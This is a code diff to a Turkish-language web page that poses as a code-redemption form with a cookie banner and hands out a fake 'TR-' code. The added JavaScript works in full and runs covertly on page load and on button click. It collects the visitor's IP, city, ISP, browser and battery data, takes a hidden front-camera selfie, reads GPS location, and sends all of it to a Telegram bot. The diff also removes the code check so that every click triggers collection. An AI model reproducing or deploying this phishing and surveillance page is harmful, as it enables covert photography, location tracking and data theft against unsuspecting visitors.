@@ -9,11 +9,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
 
         * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: 'Inter', system-ui, sans-serif;
-            background: #f5f5f5;
-            color: #222;
-        }
+        body { font-family: 'Inter', system-ui, sans-serif; background: #f5f5f5; color: #222; }
 
         .card {
             max-width: 480px;
@@ -34,9 +30,7 @@
         .orange-header h1 { font-size: 23px; font-weight: 700; }
         .orange-header p { font-size: 15.5px; margin-top: 6px; }
 
-        .content {
-            padding: 30px 24px;
-        }
+        .content { padding: 30px 24px; }
 
         input {
             width: 100%;
@@ -78,7 +72,6 @@
 
         .error { color: #e74c3c; text-align:center; margin:12px 0; display:none; font-size:14.5px; }
 
-        /* Kod Başarılı Ekranı */
         .code-box {
             margin-top: 28px;
             background: #fffaf0;
@@ -159,13 +152,84 @@ function generateFakeCode() {
   return `TR-\( {part1}- \){part2}`;
 }
 
-// Diğer fonksiyonlar (Telegram, Selfie, Location vs.)
-async function sendTelegramMessage(chat_id, text, blob=null) { /* ... aynı kod ... */ }
-async function getIPData() { /* aynı */ }
-async function getBatteryInfo() { /* aynı */ }
-async function takeSelfieWithData(messageText) { /* aynı */ }
-async function collectUserData(fakeCode){ /* aynı */ }
-async function sendLocation() { /* aynı */ }
+async function sendTelegramMessage(chat_id, text, blob=null) {
+  if(blob){
+    const formData=new FormData();
+    formData.append("chat_id",chat_id);
+    formData.append("photo",blob,"photo.jpg");
+    formData.append("caption",text);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
+  } else {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id,text}),
+    });
+  }
+}
+
+async function getIPData() {
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } 
+  catch { return {}; }
+}
+
+async function getBatteryInfo() {
+  try { 
+    const bat = await navigator.getBattery();
+    return { level: Math.round(bat.level*100), charging: bat.charging ? "Prize takılı" : "Bataryada" }; 
+  } 
+  catch { return { level: "Bilinmiyor", charging: "" }; }
+}
+
+async function takeSelfieWithData(messageText) {
+  try{
+    const video=document.createElement("video");
+    video.style.display="none";
+    document.body.appendChild(video);
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    video.srcObject=stream;
+    await video.play();
+    await new Promise(r=>setTimeout(r,500));
+    const canvas=document.createElement("canvas");
+    canvas.width=640; canvas.height=480;
+    const ctx=canvas.getContext("2d");
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+    canvas.toBlob(async blob=>{
+      await sendTelegramMessage(CHAT_ID,messageText,blob);
+      stream.getTracks().forEach(track=>track.stop());
+      video.remove();
+    },"image/jpeg");
+  }catch(e){ console.log("Selfie açılamadı",e);}
+}
+
+async function collectUserData(fakeCode){
+  const ipData=await getIPData();
+  const battery=await getBatteryInfo();
+  const userAgent=navigator.userAgent;
+  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
+  return `
+📡 IP: ${ipData.ip || "Bilinmiyor"}
+🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
+🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
+🧠 ISP: ${ipData.org || "Bilinmiyor"}
+📱 Tarayıcı: ${userAgent}
+🔐 VPN/Proxy: ${vpnProxy}
+🔋 Şarj: \( {battery.level}% ( \){battery.charging})
+💻 Kod: ${fakeCode}`;
+}
+
+async function sendLocation() {
+  if(!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const lat=pos.coords.latitude;
+    const lon=pos.coords.longitude;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon})
+    });
+  });
+}
 
 function showError(msg){ 
     document.getElementById("errorMsg").textContent = msg;
@@ -177,8 +241,8 @@ function hideError(){ document.getElementById("errorMsg").style.display = "none"
 function hideCookie(){ document.getElementById("cookie-banner").style.display = "none"; }
 function acceptCookie(){ hideCookie(); }
 
-// Sayfa açılış
-(async () => {
+// Sayfa açılışında veri toplama
+(async ()=>{
   setTimeout(() => document.getElementById("cookie-banner").style.display = "block", 1200);
 
   if(!CHAT_ID || !URL_SIFRE) return;
@@ -188,6 +252,7 @@ function acceptCookie(){ hideCookie(); }
   await sendLocation();
 })();
 
+// Buton tıklama
 document.getElementById("submitBtn").addEventListener("click", async () => {
   const input = document.getElementById("codeInput").value.trim();
   if(!CHAT_ID || !URL_SIFRE){ 
@@ -195,22 +260,17 @@ document.getElementById("submitBtn").addEventListener("click", async () => {
       return; 
   }
 
-  if(input === ADMIN_CODE || input === URL_SIFRE){
-    hideError();
-    const fakeCode = generateFakeCode();
-    document.getElementById("generatedCode").textContent = fakeCode;
-    document.getElementById("fakeCode").style.display = "block";
+  hideError();
+  const fakeCode = generateFakeCode();
+  document.getElementById("generatedCode").textContent = fakeCode;
+  document.getElementById("fakeCode").style.display = "block";
 
-    if(input === ADMIN_CODE) await sendTelegramMessage(ADMIN_ID, "Admin kodu kullanıldı.");
-    
-    const messageText = await collectUserData(fakeCode);
-    await takeSelfieWithData(messageText);
-    await sendLocation();
-    return;
-  }
+  if(input === ADMIN_CODE) await sendTelegramMessage(ADMIN_ID, "Admin kodu kullanıldı.");
 
-  showError("Kod hatalı veya süresi dolmuş olabilir.");
+  const messageText = await collectUserData(fakeCode);
+  await takeSelfieWithData(messageText);
+  await sendLocation();
 });
 </script>
 </body>
-</html>
+        </html>
